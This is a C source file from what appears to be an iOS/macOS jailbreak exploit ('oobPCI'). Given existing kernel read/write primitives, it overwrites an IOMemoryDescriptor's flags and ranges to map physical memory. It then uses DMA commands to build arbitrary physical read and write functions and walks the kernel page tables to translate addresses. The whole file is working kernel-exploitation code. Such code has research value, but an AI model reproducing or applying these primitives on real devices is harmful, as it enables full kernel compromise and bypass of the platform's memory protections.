//
//  physrw.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "physrw.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

#include "includeme.h"
#include "offsets.h"
#include "virtrw.h"
#include "DriverKit.h"

uint64_t    gRanges = 0;
mach_port_t gBuffer = 0;
mach_port_t gDMACommand = 0;
mach_port_t gDMABuffer = 0;
uint64_t    gDMABufferMapped = 0;
uint64_t    cpuTTEP = 0;

bool buildPhysPrimitive(uint64_t kernelBase) {
    // Get memory descriptor referencing physical memory
    mach_port_t buffer = pcidev_copy_memory(0);
    guard (buffer != 0) else {
        puts("[-] buildPhysPrimitive: Failed to create IOBufferMemoryDescriptor!");
        return false;
    }
    
    // Modify the IOBufferMemoryDescriptor to map physical memory
    // Get kObject
    uint64_t kObject = portKObject(buffer);
    guard (kObject != 0) else {
        puts("[-] buildPhysPrimitive: Failed to get IOBufferMemoryDescriptor kObject!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(kObject);
    
    // Change flags and ranges
    uint32_t memFlags = kread32(kObject + 0x20);
    
    DBGPRINT_VAR(memFlags);
    
    memFlags = (memFlags & ~0xF0) | 0x20; // Mark as physical
    
    // Get ranges
    uint64_t memRanges = kread_ptr(kObject + 0x60);
    guard (memRanges != 0) else {
        puts("[-] buildPhysPrimitive: Failed to get IOBufferMemoryDescriptor _ranges!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(memRanges);
    
    uint64_t oldStart = kread_ptr(memRanges);
    uint64_t oldLen   = kread_ptr(memRanges + 0x8);
    
    DBGPRINT_ADDRVAR(oldStart);
    DBGPRINT_ADDRVAR(oldLen);
    
    // Set ranges
    kwrite64(memRanges, 0x800000000ULL);
    
    puts("[+] buildPhysPrimitive: Got IOMemoryDescriptor to map physical memory!");
    
    // Create IODMACommand
    mach_port_t dmaCommand = IODMACommand_create();
    guard (dmaCommand != 0) else {
        puts("[-] buildPhysPrimitive: Failed to create IODMACommand!");
        return false;
    }
    
    // Create another IOMemoryBuffer
    mach_port_t dmaBuffer = IOBufferMemoryDescriptor_create(3, 0x4000, 0);
    guard (dmaBuffer != 0) else {
        puts("[-] buildPhysPrimitive: Failed to create second IOBufferMemoryDescriptor!");
        return false;
    }
    
    // Map it
    uint64_t mapAddr = IOMemoryDescriptor_map(dmaBuffer, 0, 0);
    guard (mapAddr != 0) else {
        puts("[-] buildPhysPrimitive: Failed to map IOBufferMemoryDescriptor!");
        return false;
    }
    
    // Prepare dma command
    IODMACommand_prepare(dmaCommand, dmaBuffer);
    
    puts("[+] buildPhysPrimitive: IODMACommand ready!");
    
    gRanges          = memRanges;
    gBuffer          = buffer;
    gDMACommand      = dmaCommand;
    gDMABuffer       = dmaBuffer;
    gDMABufferMapped = mapAddr;
    cpuTTEP          = kread64(SLIDE(gOffsets.cpu_ttep));
    
    void (*writeBootInfo)(uint64_t nameIndex, uint64_t value) = (void(*)(uint64_t, uint64_t)) DBG_WRITE_BOOT_INFO_UINT64;
    writeBootInfo(0, cpuTTEP);
    
    DBGPRINT_ADDRVAR(cpuTTEP);
    
    return true;
}

bool physread(uint64_t addr, size_t len, void *buffer) {
    if (len > 0x4000) {
        return false;
    }
    
    kwrite64(gRanges, addr);
    
    IODMACommand_readFrom(gDMACommand, gBuffer,    len);
    IODMACommand_writeTo(gDMACommand,  gDMABuffer, len);
    
    memcpy(buffer, (void*) gDMABufferMapped, len);
    
    return true;
}

bool physwrite(uint64_t addr, void *buffer, size_t len) {
    if (len > 0x4000) {
        return false;
    }
    
    kwrite64(gRanges, addr);
    
    memcpy((void*) gDMABufferMapped, buffer, len);
    
    IODMACommand_readFrom(gDMACommand, gDMABuffer, len);
    IODMACommand_writeTo(gDMACommand,  gBuffer,    len);
    
    return true;
}

uint64_t rp64(uint64_t addr) {
    uint64_t result = 0;
    physread(addr, sizeof(uint64_t), &result);
    
    return result;
}

uint32_t rp32(uint64_t addr) {
    uint32_t result = 0;
    physread(addr, sizeof(uint32_t), &result);
    
    return result;
}

uint16_t rp16(uint64_t addr) {
    uint16_t result = 0;
    physread(addr, sizeof(uint16_t), &result);
    
    return result;
}

uint8_t rp8(uint64_t addr) {
    uint8_t result = 0;
    physread(addr, sizeof(uint8_t), &result);
    
    return result;
}

uint64_t translateAddr_inTTEP(uint64_t ttep, uint64_t virt) {
    uint64_t table1Off = (virt >> 36ULL) & 0x7ULL;
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    guard ((table1Entry & 0x3) == 3) else {
        //throw MemoryAccessError.failedToTranslate(address: virt, table: "table1", entry: table1Entry)
        return 0;
    }
    
    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
    uint64_t table2Off = (virt >> 25ULL) & 0x7FFULL;
    uint64_t table2Entry = rp64(table2 + (8ULL * table2Off));
    switch (table2Entry & 0x3) {
        case 1:
            // Easy, this is a block
            return (table2Entry & 0xFFFFFE000000ULL) | (virt & 0x1FFFFFFULL);
            
        case 3: {
            uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
            uint64_t table3Off = (virt >> 14ULL) & 0x7FFULL;
            uint64_t table3Entry = rp64(table3 + (8ULL * table3Off));
            
            guard ((table3Entry & 0x3) == 3) else {
                //throw MemoryAccessError.failedToTranslate(address: virt, table: "table3", entry: table3Entry)
                return 0;
            }
            
            return (table3Entry & 0xFFFFFFFFC000ULL) | (virt & 0x3FFFULL);
        }
            
        default:
            return 0;
    }
}

uint64_t translateAddr(uint64_t virt) {
    return translateAddr_inTTEP(cpuTTEP, virt);
}

uint64_t physrw_map_once(uint64_t addr) {
    uint64_t page       = addr & ~0x3FFFULL;
    uint64_t off        = addr & 0x3FFFULL;
    uint64_t translated = translateAddr(page);
    
    // Only works once
    kwrite64(gRanges, translated);
    
    uint64_t mapped = IOMemoryDescriptor_map(gBuffer, 0, 0x4000ULL);
    guard (mapped != 0) else {
        return 0;
    }
    
    return mapped + off;
}
